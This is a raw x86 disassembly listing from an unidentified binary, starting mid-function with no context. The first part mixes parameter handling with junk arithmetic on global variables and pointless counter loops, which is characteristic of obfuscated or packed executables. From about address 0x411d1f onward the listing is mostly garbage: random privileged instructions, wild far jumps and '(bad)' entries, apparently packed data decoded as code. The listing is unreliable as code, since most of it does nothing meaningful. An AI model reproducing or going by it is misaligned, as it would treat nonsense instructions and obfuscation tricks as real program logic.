  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42aa2b
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42aa2f
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x687b52c]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x2f340f65],0x5b
  411d3c:	comiss xmm7,DWORD PTR [esi]
  411d3f:	mov    ds:0xea72b5c8,eax
  411d44:	repz or eax,0x5cfc1f31
  411d4a:	mov    ah,0x9e
  411d4c:	cmp    DWORD PTR ds:0x6d651e00,esp
  411d52:	adc    esp,DWORD PTR [edx]
  411d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d55:	mov    bl,0x85
  411d57:	inc    ebx
  411d58:	sbb    al,0x60
  411d5a:	pop    edi
  411d5b:	inc    ecx
  411d5c:	fidivr DWORD PTR [edi+0x7bcd63cf]
  411d62:	daa    
  411d63:	mov    ah,BYTE PTR [edi]
  411d65:	adc    DWORD PTR [ebx-0x3c],esi
  411d68:	mov    ebp,0x9f766443
  411d6d:	cdq    
  411d6e:	and    ah,BYTE PTR [edi]
  411d70:	std    
  411d71:	pop    eax
  411d72:	sbb    eax,0x6d3d4e46
  411d77:	fdivp  st(4),st
  411d79:	popa   
  411d7a:	test   BYTE PTR [esi-0x7a6c6697],0x1e
  411d81:	pop    edx
  411d82:	push   ecx
  411d83:	pop    ebp
  411d84:	push   edx
  411d85:	int    0x23
  411d87:	lahf   
  411d88:	aam    0x31
  411d8a:	xchg   esp,eax
  411d8b:	adc    eax,0xa347bb06
  411d90:	imul   ebp,DWORD PTR [edx],0x19
  411d93:	vcvtsd2ss xmm7,xmm6,xmm3
  411d97:	push   ss
  411d98:	loop   0x411dcf
  411d9a:	sbb    BYTE PTR [esi+ebp*1-0x5cb325b0],bl
  411da1:	mov    edx,0x795f8fc2
  411da6:	ins    DWORD PTR es:[edi],dx
  411da7:	ror    DWORD PTR [ecx+0x1c],0x8b
  411dab:	test   al,0xa7
  411dad:	ror    BYTE PTR [ecx],1
  411daf:	pop    edi
  411db0:	jno    0x411d9f
  411db2:	loop   0x411d8a
  411db4:	je     0x411dac
  411db6:	es loop 0x411d80
  411db9:	push   ecx
  411dba:	sbb    ecx,edx
  411dbc:	sub    BYTE PTR [ebp+0x22],dl
  411dbf:	ins    DWORD PTR es:[edi],dx
  411dc0:	dec    esp
  411dc1:	mov    ecx,ecx
  411dc3:	mov    ecx,0x16e0b457
  411dc8:	jbe    0x411d70
  411dca:	scas   al,BYTE PTR es:[edi]
  411dcb:	sbb    al,0xb2
  411dcd:	jmp    0x411db9
  411dcf:	cmp    BYTE PTR [esi+eiz*2-0x24e4b07c],bl
  411dd6:	xor    al,0x59
  411dd8:	rcr    dh,1
  411dda:	and    eax,0x10102be7
  411ddf:	data16 fadd st(3),st
  411de2:	and    BYTE PTR [edi],0x17
  411de5:	in     eax,0x92
  411de7:	inc    ebp
  411de8:	or     dh,BYTE PTR [edx+0x2cda27af]
  411dee:	mov    eax,ds:0xc70038d6
  411df3:	out    0x75,eax
  411df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df6:	xchg   esi,eax
  411df7:	sbb    bp,WORD PTR [edi]
  411dfa:	jmp    0x8f40:0xba722e0
  411e01:	js     0x411d8a
  411e03:	stos   BYTE PTR es:[edi],al
  411e04:	dec    eax
  411e05:	mov    DWORD PTR [ebx-0x7f18f1c4],edx
  411e0b:	cmp    al,bh
  411e0d:	inc    ebx
  411e0e:	jl     0x411e78
  411e10:	or     bl,al
  411e12:	jne    0x411e76
  411e14:	int3   
  411e15:	int3   
  411e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e17:	xor    DWORD PTR [ebx],esp
  411e19:	js     0x411e1f
  411e1b:	mov    ds:0x8fb5f1dd,eax
  411e20:	jle    0x411dfd
  411e22:	imul   ebp,DWORD PTR ds:0x345eeed6,0x3c2b7d5f
  411e2c:	imul   esp,DWORD PTR [ebx],0xe2b7e8ea
  411e32:	scas   eax,DWORD PTR es:[edi]
  411e33:	and    eax,edi
  411e35:	outs   dx,BYTE PTR ds:[esi]
  411e36:	test   eax,0x56f2521f
  411e3b:	mov    edi,0x15062f9c
  411e40:	(bad)  
  411e41:	push   eax
  411e42:	inc    ecx
  411e43:	jle    0x411e52
  411e45:	aad    0xe6
  411e47:	rdmsr  
  411e49:	gs push ss
  411e4b:	jmp    0x7cf576f7
  411e50:	and    DWORD PTR [esi],ecx
  411e52:	push   edx
  411e53:	and    BYTE PTR [ebp+0x25],al
  411e56:	nop
  411e57:	fidiv  DWORD PTR [ebx+0x4d9628eb]
  411e5d:	jg     0x411e63
  411e5f:	sub    ebx,DWORD PTR [ebp+0x51]
  411e62:	dec    ebx
  411e63:	mov    ds:0xde867933,al
  411e68:	(bad)  
  411e69:	rcl    BYTE PTR [eax],1
  411e6b:	mov    ebx,0xbc9121c
  411e70:	xor    DWORD PTR [ecx-0x466d7d84],0x131a38c1
  411e7a:	or     bl,BYTE PTR [ecx-0x1c2e469c]
  411e80:	inc    ecx
  411e81:	aas    
  411e82:	ret    
  411e83:	(bad)  
  411e84:	aad    0x55
  411e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e87:	fwait
  411e88:	mov    al,0x44
  411e8a:	adc    dl,BYTE PTR [esi-0x221f13f0]
  411e90:	into   
  411e91:	pop    ebx
  411e92:	(bad)  
  411e95:	sbb    ebx,ebp
  411e97:	aas    
  411e98:	or     edx,esi
  411e9a:	in     al,dx
  411e9b:	and    al,BYTE PTR [eax+0x1e892318]
  411ea1:	aas    
  411ea2:	into   
  411ea3:	and    ecx,DWORD PTR [ebp-0xf7971a3]
  411ea9:	iret   
  411eaa:	punpcklbw mm2,mm1
  411ead:	pop    ebp
  411eae:	push   0xffffffc3
  411eb0:	stos   BYTE PTR es:[edi],al
  411eb1:	sub    esi,eax
  411eb3:	or     cl,BYTE PTR [eax]
  411eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eb6:	loope  0x411ec0
  411eb8:	(bad)  
  411eba:	mov    WORD PTR ds:0xf11baf5c,fs
  411ec0:	mul    BYTE PTR [edx+0x2cbfaa22]
  411ec6:	bound  esp,QWORD PTR es:[edi+0x634897ae]
  411ecd:	stos   DWORD PTR es:[edi],eax
  411ece:	pop    edi
  411ecf:	push   cs
  411ed0:	mov    WORD PTR [edx+edx*2+0x3c],?
  411ed4:	pushf  
  411ed5:	out    dx,eax
  411ed6:	out    dx,al
  411ed7:	cmp    ebx,DWORD PTR [ecx-0x238aa6b]
  411edd:	adc    BYTE PTR [eax],0xf5
  411ee0:	mov    ds:0x29470167,al
  411ee5:	inc    ecx
  411ee6:	inc    edx
  411ee7:	add    BYTE PTR ds:[eax-0x17],bh
  411eeb:	dec    esi
  411eec:	mov    dh,0x7f
  411eee:	popa   
  411eef:	mov    edx,0x5c07a579
  411ef4:	std    
  411ef5:	mov    ebp,0x8b140b2c
  411efa:	test   DWORD PTR [edx+0x453aa8f2],ebx
  411f00:	ss out dx,eax
  411f02:	cdq    
  411f03:	jno    0x411f00
  411f05:	cld    
  411f06:	retf   0x3e09
  411f09:	mov    ebp,0xcda89cb1
  411f0e:	sbb    edi,DWORD PTR [edx]
  411f10:	js     0x411eef
  411f12:	sbb    eax,0x7312fa6e
  411f17:	mov    ecx,0xdf49e866
  411f1c:	in     eax,0x59
  411f1e:	xor    eax,0xfb35ae9
  411f23:	(bad)  
  411f24:	out    0xa7,al
  411f26:	cs int3 
  411f28:	dec    esi
  411f29:	mov    ebx,0x3bbbf826
  411f2e:	imul   edx,DWORD PTR [ebx],0xc2e5fae5
  411f34:	jecxz  0x411f05
  411f36:	jmp    0x5846:0x7e72cb75
  411f3d:	aad    0xe
  411f3f:	bound  edi,QWORD PTR [eax-0x42]
  411f42:	sti    
  411f43:	jmp    0x8788f273
  411f48:	push   eax
  411f49:	push   0xffffffca
  411f4b:	shl    DWORD PTR ds:0xba3a70fe,0xfa
  411f52:	sti    
  411f53:	sbb    DWORD PTR [edx],edx
  411f55:	stos   DWORD PTR es:[edi],eax
  411f56:	iret   
  411f57:	repnz mov DWORD PTR [eax+ebp*8],ebp
  411f5b:	retf   0xcf
  411f5e:	dec    esp
  411f5f:	imul   BYTE PTR [edx-0x1e9fa68f]
  411f65:	out    dx,eax
  411f66:	cmc    
  411f67:	scas   eax,DWORD PTR es:[edi]
  411f68:	das    
  411f69:	dec    edx
  411f6a:	cmc    
  411f6b:	int3   
  411f6c:	adc    eax,0xdd05b5f0
  411f71:	lods   al,BYTE PTR ds:[esi]
  411f72:	lods   al,BYTE PTR fs:[esi]
  411f74:	inc    eax
  411f75:	(bad)  
  411f76:	rcl    BYTE PTR [eax-0x1],cl
  411f79:	sbb    ah,al
  411f7b:	jnp    0x411f4f
  411f7d:	(bad)  
  411f7f:	push   ebx
  411f80:	mov    eax,ebx
  411f82:	cmp    BYTE PTR [edi-0x9242b4],dl
  411f88:	sbb    ecx,DWORD PTR [edi+0x47a509fd]
  411f8e:	jmp    0xf1d4c15b
  411f93:	and    esi,DWORD PTR [esi+0x56781e74]
  411f99:	sbb    eax,0xf1c9bbf3
  411f9e:	or     BYTE PTR [eax-0x7],dh
  411fa1:	pop    ebp
  411fa2:	add    bh,cl
  411fa4:	xor    esp,DWORD PTR [esi]
  411fa6:	imul   ebp,DWORD PTR [ebp-0x194517c],0xffffff94
  411fad:	mov    bl,0x8e
  411faf:	lods   al,BYTE PTR ds:[esi]
  411fb0:	icebp  
  411fb1:	dec    eax
  411fb2:	sti    
  411fb3:	ins    DWORD PTR es:[edi],dx
  411fb4:	loope  0x411fc1
  411fb6:	call   0xc802:0xd1eb3582
  411fbd:	imul   eax,DWORD PTR [ebx],0x27733793
  411fc3:	mov    al,ds:0x89d6ed9e
  411fc8:	test   ebp,eax
  411fca:	jg     0x411f82
  411fcc:	mov    dl,0x2b
  411fce:	retf   0xc53c
  411fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd2:	outs   dx,BYTE PTR ds:[esi]
  411fd3:	not    BYTE PTR [edi+0x5d]
  411fd6:	push   esp
  411fd7:	xor    ch,BYTE PTR [ebx-0x23]
  411fda:	test   eax,0x99169dfb
  411fdf:	int3   
  411fe0:	adc    DWORD PTR [edx+ecx*8-0x1eea75d1],esi
  411fe7:	or     cl,BYTE PTR [ecx]
  411fe9:	inc    ecx
  411fea:	mov    eax,0x74b3f823
  411fef:	sbb    edi,esp
  411ff1:	aas    
  411ff2:	sub    al,0xc2
  411ff4:	xchg   edi,eax
  411ff5:	mov    edx,0x8020c60
  411ffa:	call   0x52c1:0x4dfead59
  412001:	hlt    
  412002:	sub    al,0xf9
  412004:	sbb    DWORD PTR [ebx+eax*1+0x6a8e525],0xffffffe0
  41200c:	arpl   WORD PTR [eax+0xf],di
  41200f:	ror    al,0x1f
  412012:	cmp    eax,0xe27925fd
  412017:	xchg   ebp,eax
  412018:	je     0x411fdf
  41201a:	ds (bad) 
  41201c:	shl    ah,cl
  41201e:	pusha  
  41201f:	outs   dx,BYTE PTR ds:[esi]
  412020:	outs   dx,BYTE PTR ds:[esi]
  412021:	daa    
  412022:	ss adc bh,dh
  412025:	fistp  DWORD PTR [ecx+0x13edb822]
  41202b:	stos   DWORD PTR es:[edi],eax
  41202c:	dec    esp
  41202d:	or     ebp,DWORD PTR [ebx+0x3]
  412030:	fnstcw WORD PTR [edx+0x77]
  412033:	cs aas 
  412035:	cmp    al,0x83
  412037:	sbb    eax,0x6d5cf95e
  41203c:	mov    cl,0x80
  41203e:	pop    ebx
  41203f:	in     eax,0xd3
  412041:	aas    
  412042:	fbstp  TBYTE PTR [ebx+0x50bc7bf0]
  412048:	imul   esi,DWORD PTR es:[ebp-0x16b45a13],0x350fe5e2
  412053:	rcr    DWORD PTR [ecx+0x2c],cl
  412056:	inc    esi
  412057:	or     DWORD PTR [ecx+0x26],eax
  41205a:	ins    DWORD PTR es:[edi],dx
  41205b:	jo     0x412031
  41205d:	xchg   ebx,eax
  41205e:	mov    cl,0xc
  412060:	xchg   ebp,eax
  412061:	mov    dl,0x8a
  412063:	sub    DWORD PTR [ecx+0x6ef736c6],esi
  412069:	dec    esp
  41206a:	into   
  41206b:	pop    ecx
  41206c:	add    BYTE PTR ds:[eax+0x7ec630c2],dh
  412073:	pop    es
  412074:	inc    edi
  412075:	cdq    
  412076:	dec    ecx
  412077:	pop    ss
  412078:	stc    
  412079:	mov    edx,0x719ac211
  41207e:	inc    edi
  41207f:	mov    edx,0xa9197f15
  412084:	or     ah,dh
  412086:	mov    ch,0xdf
  412088:	ins    BYTE PTR es:[edi],dx
  412089:	enter  0xf203,0x80
  41208d:	arpl   WORD PTR [ebx-0x18],si
  412090:	push   ebx
  412091:	pop    edi
  412092:	popf   
  412093:	les    ebp,FWORD PTR [ebx-0x4e5519e]
  412099:	dec    edi
  41209a:	sbb    eax,0x4b424b96
  41209f:	mov    WORD PTR [ebp-0x7c2265c4],ss
  4120a5:	mov    DWORD PTR [edi+0xd],esi
  4120a8:	mov    ebp,0x6b7b2abc
  4120ad:	sti    
  4120ae:	daa    
  4120af:	adc    BYTE PTR [ebx],al
  4120b1:	jne    0x412109
  4120b3:	retf   0xabe4
  4120b6:	inc    esp
  4120b7:	xor    esp,DWORD PTR [edx-0x2d]
  4120ba:	rol    DWORD PTR [eax-0x7d],1
  4120bd:	mov    ds:0x92fbebdf,al
  4120c2:	mov    ?,WORD PTR [edx+0x4f]
  4120c5:	int    0x45
  4120c7:	and    eax,0xffc7d547
  4120cc:	fimul  DWORD PTR [ebx+ebp*2-0xd3773f0]
  4120d3:	push   cs
  4120d4:	les    esi,FWORD PTR [edi-0x27264675]
  4120da:	xlat   BYTE PTR ds:[ebx]
  4120db:	push   ecx
  4120dc:	hlt    
  4120dd:	jge    0x41210a
  4120df:	int3   
  4120e0:	fbld   TBYTE PTR [esi-0x5e7abbb5]
  4120e6:	push   0xffffffa2
  4120e8:	scas   al,BYTE PTR es:[edi]
  4120e9:	dec    ebp
  4120ea:	add    eax,0xdf8d255d
  4120ef:	sub    ch,0x8f
  4120f2:	add    dl,0x88
  4120f5:	xchg   esi,eax
  4120f6:	push   ds
  4120f7:	push   ds
  4120f8:	ficomp WORD PTR [eax]
  4120fa:	jp     0x412098
  4120fc:	jmp    0x5dcc358f
  412101:	sbb    al,0x83
  412103:	int3   
  412104:	or     dh,BYTE PTR [ebp-0x1d]
  412107:	gs aam 0x18
  41210a:	fs enter 0xdc25,0x31
  41210f:	lea    dx,[edx+0x23d48198]
  412116:	popf   
  412117:	add    cl,ch
  412119:	or     dh,BYTE PTR [esi-0x53a49264]
  41211f:	sahf   
  412120:	fwait
  412121:	out    dx,al
  412122:	js     0x412139
  412124:	inc    ebp
  412125:	ss push edx
  412127:	in     eax,0x7a
  412129:	add    eax,0x1ca50b9e
  41212e:	fild   QWORD PTR [ebx]
  412130:	out    dx,eax
  412131:	and    DWORD PTR [eax],0x34db6a1c
  412137:	js     0x412139
  412139:	jge    0x4121a0
  41213b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213c:	mov    ebp,0xc397bd53
  412141:	pop    esi
  412142:	jb     0x4120cb
  412144:	(bad)  
  412145:	mov    eax,0xa78e2983
  41214a:	inc    esi
  41214b:	test   DWORD PTR [edx+0x66],edx
  41214e:	repnz adc ebx,ebx
  412151:	iret   
  412152:	inc    eax
  412153:	inc    esi
  412154:	cdq    
  412155:	popf   
  412156:	dec    esi
  412157:	mov    edi,0x66bbd5ff
  41215c:	addr16 sbb eax,0x222dd316
  412162:	ss out 0x88,al
  412165:	push   0x16d0431e
  41216a:	dec    ecx
  41216b:	inc    esp
  41216c:	stos   BYTE PTR es:[edi],al
  41216d:	jno    0x4120f2
  41216f:	sub    cl,BYTE PTR [ebx+edi*1]
  412172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412173:	out    0xe5,al
  412175:	gs leave 
  412177:	and    BYTE PTR [ecx-0x37846cb4],al
  41217d:	sub    dl,BYTE PTR cs:[ecx+0x389d37fa]
  412184:	jae    0x4121c2
  412186:	(bad)  
  412187:	iret   
  412188:	sub    DWORD PTR [eax-0x42488f00],esi
  41218e:	jp     0x4121f5
  412190:	mov    ch,0x39
  412192:	lods   al,BYTE PTR ds:[esi]
  412193:	mov    esp,0x99864272
  412198:	mov    es,WORD PTR [ebp+0x67]
  41219b:	and    DWORD PTR [edx+ebx*2-0x76],0xbc1cdcd7
  4121a3:	pop    edx
  4121a4:	adc    al,0xaa
  4121a6:	aam    0x19
  4121a8:	pop    eax
  4121a9:	add    bh,dl
  4121ab:	leave  
  4121ac:	sub    al,0x18
  4121ae:	cmc    
  4121af:	and    ch,BYTE PTR [ecx-0x47106dbd]
  4121b5:	out    dx,al
  4121b6:	repz mov edi,DWORD PTR [edi+0x4b4684e7]
  4121bd:	sbb    eax,0xa1570662
  4121c2:	mov    ds:0x24ac04c0,eax
  4121c7:	into   
  4121c8:	js     0x41220d
  4121ca:	bound  esi,QWORD PTR [edi]
  4121cc:	jnp    0x412184
  4121ce:	(bad)  
  4121cf:	xchg   ebp,eax
  4121d0:	and    DWORD PTR [edi],ebp
  4121d2:	mov    dl,0x5
  4121d4:	pushf  
  4121d5:	int    0xfa
  4121d7:	jg     0x41220e
  4121d9:	int3   
  4121da:	cmp    edx,DWORD PTR [eax-0x21]
  4121dd:	add    ah,BYTE PTR [edx-0x7463589a]
  4121e3:	or     ah,BYTE PTR [eax+eax*2]
  4121e6:	(bad)  [ebx+0x52]
  4121e9:	test   BYTE PTR [esi],0xb4
  4121ec:	in     eax,0x25
  4121ee:	fst    DWORD PTR [ecx-0x9]
  4121f1:	into   
  4121f2:	jle    0x4121c4
  4121f4:	cwde   
  4121f5:	arpl   WORD PTR [esi+ebx*8],sp
  4121f8:	in     eax,dx
  4121f9:	mov    DWORD PTR [esi-0x13],ebx
  4121fc:	lods   al,BYTE PTR ds:[esi]
  4121fd:	arpl   WORD PTR [esp+edx*8],sp
  412200:	and    DWORD PTR [esp+ebx*8-0x5fb4992],esi
  412207:	xchg   ebp,eax
  412208:	call   0xa65bc447
  41220d:	jbe    0x412198
  41220f:	out    0x7a,eax
  412211:	popf   
  412212:	test   eax,0x606bd1cd
  412217:	jge    0x41222a
  412219:	lds    ebx,FWORD PTR [edx]
  41221b:	sbb    BYTE PTR [ebp-0x19],dh
  41221e:	inc    BYTE PTR [eax+0x18542caf]
  412224:	ss pop es
  412226:	xchg   ebp,eax
  412227:	add    esi,DWORD PTR [ebp+0x7e5d2b23]
  41222d:	aaa    
  41222e:	pushf  
  41222f:	cmc    
  412230:	xor    BYTE PTR [ebx],cl
  412232:	push   ecx
  412233:	fcomp  DWORD PTR [edi]
  412235:	aad    0x50
  412237:	rol    BYTE PTR [ecx+ecx*8-0x8],0xb4
  41223c:	dec    edi
  41223d:	and    al,0xb8
  41223f:	mov    WORD PTR [esi+0x49613373],fs
  412245:	fld1   
  412247:	mov    cl,0x4e
  412249:	les    eax,FWORD PTR [ebx-0x1f]
  41224c:	mov    eax,ds:0x34d256f4
  412251:	cmp    esp,DWORD PTR [esp+eax*4]
  412254:	addr16 jge 0x41229a
  412257:	test   DWORD PTR [eax+0x71fe009a],esi
  41225d:	out    dx,al
  41225e:	push   edx
  41225f:	dec    esi
  412260:	std    
  412261:	adc    al,BYTE PTR [esi+0x3f49ed43]
  412267:	(bad)  
  412269:	inc    esi
  41226a:	fdiv   DWORD PTR [edx-0x18632e35]
  412270:	jge    0x412211
  412272:	sbb    ah,bl
  412274:	dec    esi
  412275:	xchg   ecx,eax
  412276:	mov    ah,0xea
  412278:	hlt    
  412279:	or     DWORD PTR [eax],0x930a2da1
  41227f:	shr    DWORD PTR [eax+0x2935a111],0x46
  412286:	mov    gs,WORD PTR [ebx-0x388d1210]
  41228c:	pop    esi
  41228d:	sbb    eax,0x316152e
  412292:	push   ecx
  412293:	fmul   DWORD PTR [esi+0x378ec45]
  412299:	ret    0x5145
  41229c:	mov    eax,ds:0x50bb9dc0
  4122a1:	inc    ebx
  4122a2:	sub    eax,0xb8f7f6e2
  4122a7:	mov    ah,0x40
  4122a9:	fld    QWORD PTR [edi+eiz*2]
  4122ac:	shl    edi,1
  4122ae:	out    0xad,eax
  4122b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122b1:	sbb    ebx,eax
  4122b3:	into   
  4122b4:	mov    al,0x32
  4122b6:	jae    0x412325
  4122b8:	icebp  
  4122b9:	out    0xd7,eax
  4122bb:	add    al,0x88
  4122bd:	or     DWORD PTR [edi-0x6e4cd12f],eax
  4122c3:	jne    0x4122c1
  4122c5:	inc    edx
  4122c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122c7:	and    eax,0x76749b45
  4122cc:	pop    esi
  4122cd:	dec    eax
  4122ce:	ret    
  4122cf:	adc    al,0x1d
  4122d1:	clc    
  4122d2:	das    
  4122d3:	addr16 out dx,al
  4122d5:	shl    DWORD PTR [esi],cl
  4122d7:	pop    edx
  4122d8:	dec    ebp
  4122d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122da:	adc    al,dh
  4122dc:	mov    ecx,0x2f30b17e
  4122e1:	std    
  4122e2:	fwait
  4122e3:	inc    edx
  4122e4:	mov    ah,0x5f
  4122e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e7:	push   ecx
  4122e8:	xchg   edx,eax
  4122e9:	out    0x77,al
  4122eb:	xor    eax,0xdf934954
  4122f0:	jle    0x412322
  4122f2:	dec    eax
  4122f3:	call   0xb9a535f2
  4122f8:	jb     0x41227b
  4122fa:	imul   ebx
  4122fc:	adc    al,0xf
  4122fe:	xchg   edx,eax
  4122ff:	daa    
  412300:	int3   
  412301:	mov    esi,0x3ac32931
  412306:	inc    esi
  412307:	retf   0x6964
  41230a:	mov    dl,BYTE PTR [esi]
  41230c:	cmp    ecx,DWORD PTR [eax-0x69]
  41230f:	out    dx,al
  412310:	mov    ecx,0xf1a5aa1c
  412315:	mov    dh,0x5c
  412317:	mov    dl,bl
  412319:	cmp    bh,0x9e
  41231c:	add    edx,DWORD PTR [ecx]
  41231e:	(bad)  
  41231f:	push   cs
  412320:	cmp    edi,DWORD PTR [ebx-0x22]
  412323:	sbb    ah,cl
  412325:	hlt    
  412326:	call   0xabf79d45
  41232b:	push   ebp
  41232c:	add    DWORD PTR [edx],edi
  41232e:	pop    ebp
  41232f:	ror    BYTE PTR [ecx+edx*4],cl
  412332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412333:	(bad)  
  412335:	mov    BYTE PTR [ecx],cl
  412337:	jo     0x412365
  412339:	int    0xc3
  41233b:	scas   eax,DWORD PTR es:[edi]
  41233c:	sbb    ecx,eax
  41233e:	and    cl,BYTE PTR [eax+0x6a6c04eb]
  412344:	daa    
  412345:	adc    bl,BYTE PTR [eax-0x67]
  412348:	repnz add BYTE PTR [edx],dh
  41234b:	mov    cl,0xbe
  41234d:	mov    ebx,0xae7e9885
  412352:	fimul  WORD PTR [esi]
  412354:	xchg   edi,eax
  412355:	cmp    esi,DWORD PTR [eax-0x24]
  412358:	add    ecx,edi
  41235a:	lock (bad) 
  41235d:	in     eax,dx
  41235e:	gs mov esp,0x2818f68f
  412364:	pop    edi
  412365:	mov    dl,0x11
  412367:	dec    ebp
  412368:	pusha  
  412369:	sahf   
  41236a:	cmp    ecx,esi
  41236c:	push   edx
  41236d:	in     eax,0xb9
  41236f:	loope  0x412353
  412371:	dec    esi
  412372:	fwait
  412373:	sbb    DWORD PTR [ebx-0x303b29ed],edi
  412379:	mov    edx,DWORD PTR [edi]
  41237b:	psrlw  mm5,QWORD PTR [edi+0x17ddd401]
  412382:	arpl   WORD PTR [edx+0x141b42c2],dx
  412388:	gs (bad) 
  41238a:	mov    ebx,DWORD PTR [esi-0x69b1ff8e]
  412390:	mov    BYTE PTR [edi-0x20790085],bl
  412396:	or     DWORD PTR [ebp-0x78],0x47
  41239a:	out    dx,eax
  41239b:	inc    ecx
  41239c:	pop    ecx
  41239d:	xor    BYTE PTR [ecx+0xfbc58d5],ah
  4123a3:	test   DWORD PTR ds:0xf92a86db,0x7f138f9d
  4123ad:	outs   dx,DWORD PTR ds:[esi]
  4123ae:	loopne 0x412367
  4123b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b1:	or     al,cl
  4123b3:	sub    eax,0x897a8e2c
  4123b8:	pop    ds
  4123b9:	dec    eax
  4123ba:	adc    BYTE PTR [edx],bl
